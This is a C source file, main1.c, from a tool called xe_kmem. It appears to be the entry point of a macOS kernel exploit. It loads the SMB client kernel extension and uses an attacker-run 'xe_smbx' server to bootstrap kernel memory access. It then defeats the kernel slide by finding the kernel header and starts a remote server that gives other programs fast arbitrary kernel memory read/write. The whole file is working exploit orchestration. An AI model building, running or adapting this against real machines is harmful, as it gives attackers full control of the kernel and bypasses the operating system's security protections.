//
//  main1.c
//  xe_kmem
//
//  Created by admin on 2/21/22.
//

#include <stdio.h>
#include <limits.h>
#include <unistd.h>

#include <dispatch/dispatch.h>

#include <sys/resource.h>
#include <arpa/inet.h>

#include <xe/xe.h>
#include <xe/util/binary.h>
#include <xe/util/assert.h>
#include <xe/util/msdosfs.h>
#include <xe/memory/kmem.h>
#include <xe/memory/kmem_fast.h>
#include <xe/memory/kmem_remote.h>
#include <xe/slider/kernel.h>

#include <xe_smbx/smbx_conf.h>

#include "smb/client.h"
#include "smb/params.h"

#include "kmem_bootstrap.h"


int main(int argc, const char* argv[]) {
    xe_init();
    smb_client_load_kext();
    
    char* kmem_server_path = NULL;
    
    int ch;
    while ((ch = getopt(argc, (char**)argv, "k:")) != -1) {
        switch (ch) {
            case 'k': {
                kmem_server_path = optarg;
                break;
            }
            case '?':
            default: {
                xe_log_info("usage: xe_kmem [-k kmem-server-uds]");
                exit(1);
            }
        }
    }
    
    // Increase open file limit
    struct rlimit nofile_limit;
    int res = getrlimit(RLIMIT_NOFILE, &nofile_limit);
    xe_assert(res == 0);
    nofile_limit.rlim_cur = nofile_limit.rlim_max;
    res = setrlimit(RLIMIT_NOFILE, &nofile_limit);
    xe_assert(res == 0);

    // Base socket address of xe_smbx server
    struct sockaddr_in smb_addr;
    bzero(&smb_addr, sizeof(smb_addr));
    smb_addr.sin_family = AF_INET;
    smb_addr.sin_len = sizeof(smb_addr);
    smb_addr.sin_port = htons(XE_SMBX_PORT);
    inet_aton(XE_SMBX_HOST, &smb_addr.sin_addr);
    
    xe_kmem_backend_t kmem_slow = kmem_bootstrap_create(&smb_addr);
    xe_kmem_use_backend(kmem_slow);
    uintptr_t meh = kmem_bootstrap_get_mh_execute_header(kmem_slow);
    xe_slider_kernel_init(meh);
    
    xe_kmem_backend_t kmem_fast = xe_memory_kmem_fast_create();
    xe_kmem_use_backend(kmem_fast);
    
    kmem_bootstrap_destroy(&kmem_slow);
    
    int error = xe_kmem_remote_server_start(meh, kmem_server_path);
    if (error) {
        xe_log_error("failed to start remote kmem server, err: %s", strerror(error));
        xe_memory_kmem_fast_destroy(&kmem_fast);
        exit(1);
    }
    
    xe_memory_kmem_fast_destroy(&kmem_fast);
    return 0;
}

